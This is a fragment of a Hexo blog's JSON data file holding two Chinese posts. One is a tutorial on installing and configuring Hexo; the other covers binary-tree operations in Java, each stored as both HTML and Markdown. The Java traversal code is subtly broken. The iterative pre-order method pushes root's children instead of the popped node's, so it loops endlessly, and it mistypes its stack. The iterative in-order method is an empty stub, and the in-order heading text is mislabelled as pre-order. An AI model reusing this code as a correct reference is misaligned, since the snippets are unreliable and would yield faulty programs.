class=\"built_in\">cd</span> hexo-blog</span></span><br><span class=\"line\"></span><br><span class=\"line\">3、初始化工作目录</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> hexo init</span></span><br><span class=\"line\"></span><br><span class=\"line\">4、本地启动hexo</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> hexo serve</span></span><br></pre></td></tr></table></figure>\n<p>到此一个hexo博客已经搭建完成了，可以访问 <a href=\"http://localhost:4000/\" target=\"_blank\" rel=\"noopener\">http://localhost:4000/</a> 查看博客的效果。</p>\n<p><br></p>\n<p>当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。</p>\n<h2 id=\"三、hexo配置\"><a href=\"#三、hexo配置\" class=\"headerlink\" title=\"三、hexo配置\"></a>三、hexo配置</h2><p>hexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照<a href=\"https://hexo.io/zh-cn/docs/configuration.html\" target=\"_blank\" rel=\"noopener\">hexo官网文档</a>进行配置，当然，有兴趣可以参照<a href=\"https://github.com/AriesRen/ariesren.github.io\" target=\"_blank\" rel=\"noopener\">我的配置</a></p>\n<p>网站配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Site</span></span><br><span class=\"line\"><span class=\"attr\">title:</span> <span class=\"string\">Aries'</span> <span class=\"string\">blog</span> <span class=\"string\">网站标题</span></span><br><span class=\"line\"><span class=\"attr\">subtitle:</span> <span class=\"string\">副标题</span></span><br><span class=\"line\"><span class=\"attr\">description:</span> <span class=\"string\">我不生产知识，我只是知识的搬运工。</span> <span class=\"string\">网站一句话描述</span></span><br><span class=\"line\"><span class=\"attr\">keywords:</span> <span class=\"string\">关键词</span></span><br><span class=\"line\"><span class=\"attr\">author:</span> <span class=\"string\">无名万物</span> <span class=\"string\">作者</span></span><br><span class=\"line\"><span class=\"attr\">language:</span> <span class=\"string\">zh-CN</span> <span class=\"string\">语言</span></span><br><span class=\"line\"><span class=\"attr\">timezone:</span> <span class=\"string\">Asia/Shanghai</span> <span class=\"string\">时区</span></span><br></pre></td></tr></table></figure></p>\n<p>文章配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">url:</span> <span class=\"attr\">http://blog.renhj.org</span>  <span class=\"string\">网站url</span></span><br><span class=\"line\"><span class=\"attr\">root:</span> <span class=\"string\">/</span>   <span class=\"string\">文章根路径</span></span><br><span class=\"line\"><span class=\"attr\">permalink:</span> <span class=\"string\">posts/:year-:month-:day-:title.html</span>  <span class=\"string\">文章url</span></span><br><span class=\"line\"><span class=\"attr\">permalink_defaults:</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"四、创建新文章\"><a href=\"#四、创建新文章\" class=\"headerlink\" title=\"四、创建新文章\"></a>四、创建新文章</h2><p>你可以通过以下命令来创建一篇新文章<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure></p>\n<p>命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局.</p>\n<p>当然也可以新建一个草稿： draft，这种布局在建立时会保存到<code>source/_drafts</code>文件夹，也可以通过<code>publish</code>来将草稿移动到正式文件夹。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 新建草稿文章</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> hexo new draft &lt;title&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 将文章正式发布</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> hexo publish [layout] &lt;title&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>Front-matter</strong></p>\n<p>Front-matter是文章最上方以<code>---</code> 分割的区域，用于指定个别文件的变量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">layout: 指定文章的布局属性</span><br><span class=\"line\">title： 文章标题</span><br><span class=\"line\">data：建立日期</span><br><span class=\"line\">updated： 更新日期</span><br><span class=\"line\">comments： 是否开启文章的评论功能(如果有的话)</span><br><span class=\"line\">tags： 标签</span><br><span class=\"line\">categories：分类</span><br><span class=\"line\">permalink： 覆盖文章的网址</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<h2 id=\"修改美化\"><a href=\"#修改美化\" class=\"headerlink\" title=\"修改美化\"></a>修改美化</h2><p>默认的主题是有点丑，可以去<a href=\"https://hexo.io/themes/\" target=\"_blank\" rel=\"noopener\">hexo的主题商店</a> 找一个自己喜欢的、漂亮的主题。</p>\n<p>本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：<a href=\"http://theme-next.iissnan.com/\" target=\"_blank\" rel=\"noopener\">hexo nexT主题</a>，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。</p>\n<h2 id=\"一、预备\"><a href=\"#一、预备\" class=\"headerlink\" title=\"一、预备\"></a>一、预备</h2><p><strong>1、安装Nodejs及npm</strong></p>\n<p>Nodejs下载地址： <a href=\"https://nodejs.org/zh-cn/download/\" target=\"_blank\" rel=\"noopener\">官网下载地址：https://nodejs.org/zh-cn/download/</a></p>\n<p><strong>2、安装Git</strong></p>\n<p>Git下载地址： <a href=\"https://git-scm.com/download/\" target=\"_blank\" rel=\"noopener\">官网下载地址：https://git-scm.com/download/</a></p>\n<p>安装完成后，执行如下命令，可以显示版本号就算安装成功了  </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> node -v</span></span><br><span class=\"line\">v9.11.1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> npm -v</span></span><br><span class=\"line\">6.3.0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> git --version</span></span><br><span class=\"line\">git version 2.17.0.windows.1</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、安装hexo\"><a href=\"#二、安装hexo\" class=\"headerlink\" title=\"二、安装hexo\"></a>二、安装hexo</h2><p>进入命令行，执行如下命令:  </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、全局安装hexo</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> npm install hexo -g</span></span><br><span class=\"line\"></span><br><span class=\"line\">2、创建hexo工作目录</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> mkdir hexo-blog</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"built_in\">cd</span> hexo-blog</span></span><br><span class=\"line\"></span><br><span class=\"line\">3、初始化工作目录</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> hexo init</span></span><br><span class=\"line\"></span><br><span class=\"line\">4、本地启动hexo</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> hexo serve</span></span><br></pre></td></tr></table></figure>\n<p>到此一个hexo博客已经搭建完成了，可以访问 <a href=\"http://localhost:4000/\" target=\"_blank\" rel=\"noopener\">http://localhost:4000/</a> 查看博客的效果。</p>\n<p><br></p>\n<p>当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。</p>\n<h2 id=\"三、hexo配置\"><a href=\"#三、hexo配置\" class=\"headerlink\" title=\"三、hexo配置\"></a>三、hexo配置</h2><p>hexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照<a href=\"https://hexo.io/zh-cn/docs/configuration.html\" target=\"_blank\" rel=\"noopener\">hexo官网文档</a>进行配置，当然，有兴趣可以参照<a href=\"https://github.com/AriesRen/ariesren.github.io\" target=\"_blank\" rel=\"noopener\">我的配置</a></p>\n<p>网站配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Site</span></span><br><span class=\"line\"><span class=\"attr\">title:</span> <span class=\"string\">Aries'</span> <span class=\"string\">blog</span> <span class=\"string\">网站标题</span></span><br><span class=\"line\"><span class=\"attr\">subtitle:</span> <span class=\"string\">副标题</span></span><br><span class=\"line\"><span class=\"attr\">description:</span> <span class=\"string\">我不生产知识，我只是知识的搬运工。</span> <span class=\"string\">网站一句话描述</span></span><br><span class=\"line\"><span class=\"attr\">keywords:</span> <span class=\"string\">关键词</span></span><br><span class=\"line\"><span class=\"attr\">author:</span> <span class=\"string\">无名万物</span> <span class=\"string\">作者</span></span><br><span class=\"line\"><span class=\"attr\">language:</span> <span class=\"string\">zh-CN</span> <span class=\"string\">语言</span></span><br><span class=\"line\"><span class=\"attr\">timezone:</span> <span class=\"string\">Asia/Shanghai</span> <span class=\"string\">时区</span></span><br></pre></td></tr></table></figure></p>\n<p>文章配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">url:</span> <span class=\"attr\">http://blog.renhj.org</span>  <span class=\"string\">网站url</span></span><br><span class=\"line\"><span class=\"attr\">root:</span> <span class=\"string\">/</span>   <span class=\"string\">文章根路径</span></span><br><span class=\"line\"><span class=\"attr\">permalink:</span> <span class=\"string\">posts/:year-:month-:day-:title.html</span>  <span class=\"string\">文章url</span></span><br><span class=\"line\"><span class=\"attr\">permalink_defaults:</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"四、创建新文章\"><a href=\"#四、创建新文章\" class=\"headerlink\" title=\"四、创建新文章\"></a>四、创建新文章</h2><p>你可以通过以下命令来创建一篇新文章<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure></p>\n<p>命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局.</p>\n<p>当然也可以新建一个草稿： draft，这种布局在建立时会保存到<code>source/_drafts</code>文件夹，也可以通过<code>publish</code>来将草稿移动到正式文件夹。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 新建草稿文章</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> hexo new draft &lt;title&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 将文章正式发布</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> hexo publish [layout] &lt;title&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>Front-matter</strong></p>\n<p>Front-matter是文章最上方以<code>---</code> 分割的区域，用于指定个别文件的变量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">layout: 指定文章的布局属性</span><br><span class=\"line\">title： 文章标题</span><br><span class=\"line\">data：建立日期</span><br><span class=\"line\">updated： 更新日期</span><br><span class=\"line\">comments： 是否开启文章的评论功能(如果有的话)</span><br><span class=\"line\">tags： 标签</span><br><span class=\"line\">categories：分类</span><br><span class=\"line\">permalink： 覆盖文章的网址</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<h2 id=\"修改美化\"><a href=\"#修改美化\" class=\"headerlink\" title=\"修改美化\"></a>修改美化</h2><p>默认的主题是有点丑，可以去<a href=\"https://hexo.io/themes/\" target=\"_blank\" rel=\"noopener\">hexo的主题商店</a> 找一个自己喜欢的、漂亮的主题。</p>\n<p>本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：<a href=\"http://theme-next.iissnan.com/\" target=\"_blank\" rel=\"noopener\">hexo nexT主题</a>，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"二叉树的各种操作","date":"2019-04-17T07:51:47.000Z","_content":"\n本篇文章针对面试中常见的二叉树操作做个总结：\n\n1、 二叉树的遍历（前序、中序、后序、层次）\n2、 求树的节点数目\n3、 求树的叶子节点数目\n4、 求树的深度\n5、 求二叉树第k层节点个数\n6、 求二叉树镜像\n7、 求两个节点的最低公共祖先节点\n8、 求任意两节点间距离、最长距离\n9、 二叉树前序中序 推导后序\n\n{% asset_img 二叉树01.jpg %}\n\n## 二叉树遍历\n\t\n### 前序遍历\n\n前序遍历即根节点在前： 根 -> 左 -> 右  1-2-4-5-3-6\n\n```java\n// 递归实现\npublic static <T> void preOrder(TreeNode<T> root){\n\tif (root == null) return;\n\tSystem.out.println(root.data);\n\tpreOrder(root.left);\n\tpreOrder(root.right);\n}\n\n// 非递归实现\npublic static <T> void preOrder01(TreeNode<T> root) {\n\tif (root == null) return;\n\tLinkedList<T> stack = new LinkedList<>();\n\tstack.push(root);\n\twhile(!stack.isEmpty()){\n\t\tTreeNode<T> node = stack.pop();\n\t\tSystem.out.println(node.data);\n\t\tif (node.right!=null) {\n\t\t\tstack.push(root.right);\n\t\t}\n\t\tif (node.left!=null) {\n\t\t\tstack.push(root.left);\n\t\t}\n\t}\n}\n```\n\n### 中序遍历\n\n前序遍历即根节点在前： 左 -> 根 -> 右  4-2-5-1-6-3\n\n```java\n// 递归实现\npublic static <T> void inOrder(TreeNode<T> root) {\n\tif(root == null) return;\n\tinOrder(root.left);\n\tSystem.out.println(root.data);\n\tinOrder(root.right);\n}\n\n// 非递归实现\npublic static <T> void inOrder01(TreeNode<T> root) {\n\t\n}\n```\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/二叉树的各种操作.md","raw":"---\ntitle: 二叉树的各种操作\ndate: 2019-04-17 15:51:47\ntags: ['二叉树','算法']\ncategories:\n---\n\n本篇文章针对面试中常见的二叉树操作做个总结：\n\n1、 二叉树的遍历（前序、中序、后序、层次）\n2、 求树的节点数目\n3、 求树的叶子节点数目\n4、 求树的深度\n5、 求二叉树第k层节点个数\n6、 求二叉树镜像\n7、 求两个节点的最低公共祖先节点\n8、 求任意两节点间距离、最长距离\n9、 二叉树前序中序 推导后序\n\n{% asset_img 二叉树01.jpg %}\n\n## 二叉树遍历\n\t\n### 前序遍历\n\n前序遍历即根节点在前： 根 -> 左 -> 右  1-2-4-5-3-6\n\n```java\n// 递归实现\npublic static <T> void preOrder(TreeNode<T> root){\n\tif (root == null) return;\n\tSystem.out.println(root.data);\n\tpreOrder(root.left);\n\tpreOrder(root.right);\n}\n\n// 非递归实现\npublic static <T> void preOrder01(TreeNode<T> root) {\n\tif (root == null) return;\n\tLinkedList<T> stack = new LinkedList<>();\n\tstack.push(root);\n\twhile(!stack.isEmpty()){\n\t\tTreeNode<T> node = stack.pop();\n\t\tSystem.out.println(node.data);\n\t\tif (node.right!=null) {\n\t\t\tstack.push(root.right);\n\t\t}\n\t\tif (node.left!=null) {\n\t\t\tstack.push(root.left);\n\t\t}\n\t}\n}\n```\n\n### 中序遍历\n\n前序遍历即根节点在前： 左 -> 根 -> 右  4-2-5-1-6-3\n\n```java\n// 递归实现\npublic static <T> void inOrder(TreeNode<T> root) {\n\tif(root == null) return;\n\tinOrder(root.left);\n\tSystem.out.println(root.data);\n\tinOrder(root.right);\n}\n\n// 非递归实现\npublic static <T> void inOrder01(TreeNode<T> root) {\n\t\n}\n```\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"二叉树的各种操作","published":1,"updated":"2019-06-26T03:52:03.504Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gl000zo25t26e6k5rk","content":"<p>本篇文章针对面试中常见的二叉树操作做个总结：</p>\n<p>1、 二叉树的遍历（前序、中序、后序、层次）<br>2、 求树的节点数目<br>3、 求树的叶子节点数目<br>4、 求树的深度<br>5、 求二叉树第k层节点个数<br>6、 求二叉树镜像<br>7、 求两个节点的最低公共祖先节点<br>8、 求任意两节点间距离、最长距离<br>9、 二叉树前序中序 推导后序</p>\n<img src=\"/posts/2019-04-17-二叉树的各种操作/二叉树01.jpg\">\n<h2 id=\"二叉树遍历\"><a href=\"#二叉树遍历\" class=\"headerlink\" title=\"二叉树遍历\"></a>二叉树遍历</h2><h3 id=\"前序遍历\"><a href=\"#前序遍历\" class=\"headerlink\" title=\"前序遍历\"></a>前序遍历</h3><p>前序遍历即根节点在前： 根 -&gt; 左 -&gt; 右  1-2-4-5-3-6</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 递归实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrder</span><span class=\"params\">(TreeNode&lt;T&gt; root)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (root == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\tSystem.out.println(root.data);</span><br><span class=\"line\">\tpreOrder(root.left);</span><br><span class=\"line\">\tpreOrder(root.right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 非递归实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrder01</span><span class=\"params\">(TreeNode&lt;T&gt; root)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (root == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\tLinkedList&lt;T&gt; stack = <span class=\"keyword\">new</span> LinkedList&lt;&gt;();</span><br><span class=\"line\">\tstack.push(root);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(!stack.isEmpty())&#123;</span><br><span class=\"line\">\t\tTreeNode&lt;T&gt; node = stack.pop();</span><br><span class=\"line\">\t\tSystem.out.println(node.data);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (node.right!=<span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">\t\t\tstack.push(root.right);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (node.left!=<span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">\t\t\tstack.push(root.left);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"中序遍历\"><a href=\"#中序遍历\" class=\"headerlink\" title=\"中序遍历\"></a>中序遍历</h3><p>前序遍历即根节点在前： 左 -&gt; 根 -&gt; 右  4-2-5-1-6-3</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 递归实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrder</span><span class=\"params\">(TreeNode&lt;T&gt; root)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(root == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\tinOrder(root.left);</span><br><span class=\"line\">\tSystem.out.println(root.data);</span><br><span class=\"line\">\tinOrder(root.right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 非递归实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrder01</span><span class=\"params\">(TreeNode&lt;T&gt; root)</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p>本篇文章针对面试中常见的二叉树操作做个总结：</p>\n<p>1、 二叉树的遍历（前序、中序、后序、层次）<br>2、 求树的节点数目<br>3、 求树的叶子节点数目<br>4、 求树的深度<br>5、 求二叉树第k层节点个数<br>6、 求二叉树镜像<br>7、 求两个节点的最低公共祖先节点<br>8、 求任意两节点间距离、最长距离<br>9、 二叉树前序中序 推导后序</p>\n<img src=\"/posts/2019-04-17-二叉树的各种操作/二叉树01.jpg\">\n<h2 id=\"二叉树遍历\"><a href=\"#二叉树遍历\" class=\"headerlink\" title=\"二叉树遍历\"></a>二叉树遍历</h2><h3 id=\"前序遍历\"><a href=\"#前序遍历\" class=\"headerlink\" title=\"前序遍历\"></a>前序遍历</h3><p>前序遍历即根节点在前： 根 -&gt; 左 -&gt; 右  1-2-4-5-3-6</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 递归实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrder</span><span class=\"params\">(TreeNode&lt;T&gt; root)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (root == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\tSystem.out.println(root.data);</span><br><span class=\"line\">\tpreOrder(root.left);</span><br><span class=\"line\">\tpreOrder(root.right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 非递归实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrder01</span><span class=\"params\">(TreeNode&lt;T&gt; root)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (root == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\tLinkedList&lt;T&gt; stack = <span class=\"keyword\">new</span> LinkedList&lt;&gt;();</span><br><span class=\"line\">\tstack.push(root);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(!stack.isEmpty())&#123;</span><br><span class=\"line\">\t\tTreeNode&lt;T&gt; node = stack.pop();</span><br><span class=\"line\">\t\tSystem.out.println(node.data);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (node.right!=<span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">\t\t\tstack.push(root.right);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (node.left!=<span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">\t\t\tstack.push(root.left);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"中序遍历\"><a href=\"#中序遍历\" class=\"headerlink\" 